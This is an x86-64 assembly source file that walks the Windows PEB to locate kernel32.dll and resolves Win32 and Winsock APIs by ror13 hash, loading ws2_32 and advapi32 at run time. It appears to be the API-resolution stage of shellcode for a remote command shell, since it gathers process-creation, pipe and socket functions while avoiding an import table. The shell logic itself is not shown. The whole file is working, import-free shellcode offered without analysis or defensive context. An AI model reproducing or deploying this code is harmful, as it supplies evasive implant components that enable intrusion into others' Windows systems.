; peb.asm - PEB walking and API resolution for Windows x86-64
; Ported from Vapor. Resolves all Win32 APIs via hash lookup.

; ============================================================================
; ror13 hash constants for kernel32.dll functions
; ============================================================================
%define H_CreateProcessA       0x16b3fe72
%define H_CreateThread         0xca2bd06b
%define H_WaitForSingleObject  0xce05d9ad
%define H_WaitForMultipleObjects 0x23ead524
%define H_CreatePipe           0x170c8f80
%define H_ReadFile             0x10fa6516
%define H_WriteFile            0xe80a791f
%define H_CloseHandle          0x0ffd97fb
%define H_ExitProcess          0x73e2d87e
%define H_GetCommandLineA      0x36ef7370
%define H_SetHandleInformation 0x7f9e1144
%define H_TerminateProcess     0x78b5b983
%define H_LoadLibraryA         0xec0e4e8e
%define H_GetProcAddress       0x7c0dfcaa
%define H_GetStdHandle         0x7487d823

; ws2_32.dll function hashes
%define H_WSAStartup           0x3bfcedcb
%define H_socket               0x492f0b6e
%define H_bind                 0xc7701aa4
%define H_listen               0xe92eada4
%define H_accept               0x498649e5
%define H_connect              0x60aaf9ec
%define H_send                 0xe97019a4
%define H_recv                 0xe71819b6
%define H_closesocket          0x79c679e7

; advapi32.dll function hash
%define H_SystemFunction036    0xa8a1833c

; ============================================================================
; API table indices
; ============================================================================
%define API_CreateProcessA       0
%define API_CreateThread         1
%define API_WaitForSingleObject  2
%define API_WaitForMultipleObjects 3
%define API_CreatePipe           4
%define API_ReadFile             5
%define API_WriteFile            6
%define API_CloseHandle          7
%define API_ExitProcess          8
%define API_GetCommandLineA      9
%define API_SetHandleInformation 10
%define API_TerminateProcess     11
%define API_LoadLibraryA         12
%define API_GetProcAddress       13
%define API_GetStdHandle         14
%define API_WSAStartup           15
%define API_socket               16
%define API_bind                 17
%define API_listen               18
%define API_accept               19
%define API_connect              20
%define API_send                 21
%define API_recv                 22
%define API_closesocket          23
%define API_SystemFunction036    24
%define API_COUNT                25

; ============================================================================
; find_kernel32 - Walk PEB InMemoryOrderModuleList to find kernel32.dll base
; Output: rax = kernel32.dll base address
; Clobbers: rcx, rdx, rdi, rsi
; ============================================================================
find_kernel32:
    mov     rax, [gs:0x60]          ; PEB
    mov     rax, [rax + 0x18]       ; PEB_LDR_DATA
    mov     rsi, [rax + 0x20]       ; InMemoryOrderModuleList.Flink
.next_mod:
    mov     rax, [rsi + 0x20]       ; DllBase
    mov     rdi, [rsi + 0x50]       ; BaseDllName.Buffer (UNICODE)
    movzx   ecx, word [rsi + 0x48]  ; BaseDllName.Length (bytes)
    test    rax, rax
    jz      .next_link
    push    rax
    push    rsi
    xor     edx, edx
    shr     ecx, 1                  ; length in chars
.hash_mod_name:
    test    ecx, ecx
    jz      .check_mod_hash
    movzx   eax, word [rdi]
    cmp     al, 'A'
    jb      .no_lower
    cmp     al, 'Z'
    ja      .no_lower
    or      al, 0x20
.no_lower:
    ror     edx, 13
    add     edx, eax
    add     rdi, 2
    dec     ecx
    jmp     .hash_mod_name
.check_mod_hash:
    cmp     edx, 0x8fecd63f         ; hash of "kernel32.dll"
    pop     rsi
    pop     rax
    je      .found_kernel32
.next_link:
    mov     rsi, [rsi]              ; Flink
    jmp     .next_mod
.found_kernel32:
    ret

; ============================================================================
; resolve_hash - Resolve export by ror13 hash from a module
; Input:  rcx = module base, edx = target hash
; Output: rax = function address (0 on failure)
; ============================================================================
resolve_hash:
    push    rbx
    push    rsi
    push    rdi
    push    r12
    push    r13

    mov     r12, rcx                ; module base
    mov     r13d, edx               ; target hash

    ; PE header
    mov     eax, [r12 + 0x3c]       ; e_lfanew
    lea     rax, [r12 + rax]        ; NT headers
    mov     eax, [rax + 0x88]       ; Export directory RVA
    test    eax, eax
    jz      .resolve_fail
    lea     rbx, [r12 + rax]        ; Export directory

    mov     ecx, [rbx + 0x18]       ; NumberOfNames
    mov     eax, [rbx + 0x20]       ; AddressOfNames RVA
    lea     rsi, [r12 + rax]

.search_exports:
    test    ecx, ecx
    jz      .resolve_fail
    dec     ecx
    mov     eax, [rsi + rcx * 4]
    lea     rdi, [r12 + rax]        ; function name string
    ; Hash the function name
    xor     edx, edx
.hash_fn_name:
    movzx   eax, byte [rdi]
    test    al, al
    jz      .compare_hash
    ror     edx, 13
    add     edx, eax
    inc     rdi
    jmp     .hash_fn_name
.compare_hash:
    cmp     edx, r13d
    jnz     .search_exports

    ; Found — get ordinal then address
    mov     eax, [rbx + 0x24]       ; AddressOfNameOrdinals RVA
    lea     rdi, [r12 + rax]
    movzx   eax, word [rdi + rcx * 2]  ; ordinal
    mov     edi, [rbx + 0x1c]       ; AddressOfFunctions RVA
    lea     rdi, [r12 + rdi]
    mov     eax, [rdi + rax * 4]    ; function RVA
    lea     rax, [r12 + rax]        ; function address

    pop     r13
    pop     r12
    pop     rdi
    pop     rsi
    pop     rbx
    ret

.resolve_fail:
    xor     eax, eax
    pop     r13
    pop     r12
    pop     rdi
    pop     rsi
    pop     rbx
    ret

; ============================================================================
; resolve_all_apis - Find kernel32, resolve all APIs, load ws2_32 + advapi32
; Input:  r15 = pointer to api_table (25 qwords)
; Output: api_table filled, r15 preserved
; Clobbers: all volatile registers
; ============================================================================
resolve_all_apis:
    push    rbx
    push    rdi
    push    rsi
    push    r12
    push    r13
    push    r14
    sub     rsp, 40                 ; shadow space + alignment

    ; --- Step 1: Find kernel32.dll ---
    call    find_kernel32
    mov     r12, rax                ; r12 = kernel32 base

    ; --- Step 2: Resolve kernel32 functions ---
    ; Macro-like pattern: resolve_hash(r12, hash) -> store in api_table

    ; CreateProcessA
    mov     rcx, r12
    mov     edx, H_CreateProcessA
    call    resolve_hash
    mov     [r15 + API_CreateProcessA * 8], rax

    ; CreateThread
    mov     rcx, r12
    mov     edx, H_CreateThread
    call    resolve_hash
    mov     [r15 + API_CreateThread * 8], rax

    ; WaitForSingleObject
    mov     rcx, r12
    mov     edx, H_WaitForSingleObject
    call    resolve_hash
    mov     [r15 + API_WaitForSingleObject * 8], rax

    ; WaitForMultipleObjects
    mov     rcx, r12
    mov     edx, H_WaitForMultipleObjects
    call    resolve_hash
    mov     [r15 + API_WaitForMultipleObjects * 8], rax

    ; CreatePipe
    mov     rcx, r12
    mov     edx, H_CreatePipe
    call    resolve_hash
    mov     [r15 + API_CreatePipe * 8], rax

    ; ReadFile
    mov     rcx, r12
    mov     edx, H_ReadFile
    call    resolve_hash
    mov     [r15 + API_ReadFile * 8], rax

    ; WriteFile
    mov     rcx, r12
    mov     edx, H_WriteFile
    call    resolve_hash
    mov     [r15 + API_WriteFile * 8], rax

    ; CloseHandle
    mov     rcx, r12
    mov     edx, H_CloseHandle
    call    resolve_hash
    mov     [r15 + API_CloseHandle * 8], rax

    ; ExitProcess
    mov     rcx, r12
    mov     edx, H_ExitProcess
    call    resolve_hash
    mov     [r15 + API_ExitProcess * 8], rax

    ; GetCommandLineA
    mov     rcx, r12
    mov     edx, H_GetCommandLineA
    call    resolve_hash
    mov     [r15 + API_GetCommandLineA * 8], rax

    ; SetHandleInformation
    mov     rcx, r12
    mov     edx, H_SetHandleInformation
    call    resolve_hash
    mov     [r15 + API_SetHandleInformation * 8], rax

    ; TerminateProcess
    mov     rcx, r12
    mov     edx, H_TerminateProcess
    call    resolve_hash
    mov     [r15 + API_TerminateProcess * 8], rax

    ; LoadLibraryA
    mov     rcx, r12
    mov     edx, H_LoadLibraryA
    call    resolve_hash
    mov     [r15 + API_LoadLibraryA * 8], rax

    ; GetProcAddress
    mov     rcx, r12
    mov     edx, H_GetProcAddress
    call    resolve_hash
    mov     [r15 + API_GetProcAddress * 8], rax

    ; GetStdHandle
    mov     rcx, r12
    mov     edx, H_GetStdHandle
    call    resolve_hash
    mov     [r15 + API_GetStdHandle * 8], rax

    ; --- Step 3: Load ws2_32.dll ---
    call    .get_ws2_str
    db      'ws2_32.dll', 0
.get_ws2_str:
    pop     rcx                     ; rcx = pointer to "ws2_32.dll"
    call    [r15 + API_LoadLibraryA * 8]
    mov     r13, rax                ; r13 = ws2_32.dll base

    ; Resolve ws2_32 functions
    mov     rcx, r13
    mov     edx, H_WSAStartup
    call    resolve_hash
    mov     [r15 + API_WSAStartup * 8], rax

    mov     rcx, r13
    mov     edx, H_socket
    call    resolve_hash
    mov     [r15 + API_socket * 8], rax

    mov     rcx, r13
    mov     edx, H_bind
    call    resolve_hash
    mov     [r15 + API_bind * 8], rax

    mov     rcx, r13
    mov     edx, H_listen
    call    resolve_hash
    mov     [r15 + API_listen * 8], rax

    mov     rcx, r13
    mov     edx, H_accept
    call    resolve_hash
    mov     [r15 + API_accept * 8], rax

    mov     rcx, r13
    mov     edx, H_connect
    call    resolve_hash
    mov     [r15 + API_connect * 8], rax

    mov     rcx, r13
    mov     edx, H_send
    call    resolve_hash
    mov     [r15 + API_send * 8], rax

    mov     rcx, r13
    mov     edx, H_recv
    call    resolve_hash
    mov     [r15 + API_recv * 8], rax

    mov     rcx, r13
    mov     edx, H_closesocket
    call    resolve_hash
    mov     [r15 + API_closesocket * 8], rax

    ; --- Step 4: Load advapi32.dll and resolve SystemFunction036 via GetProcAddress ---
    call    .get_adv_str
    db      'advapi32.dll', 0
.get_adv_str:
    pop     rcx                     ; rcx = pointer to "advapi32.dll"
    call    [r15 + API_LoadLibraryA * 8]
    mov     r14, rax                ; r14 = advapi32.dll base

    ; Use GetProcAddress for SystemFunction036 (RtlGenRandom)
    mov     rcx, r14
    call    .get_sf036_str
    db      'SystemFunction036', 0
.get_sf036_str:
    pop     rdx                     ; rdx = pointer to "SystemFunction036"
    call    [r15 + API_GetProcAddress * 8]
    mov     [r15 + API_SystemFunction036 * 8], rax

    add     rsp, 40
    pop     r14
    pop     r13
    pop     r12
    pop     rsi
    pop     rdi
    pop     rbx
    ret
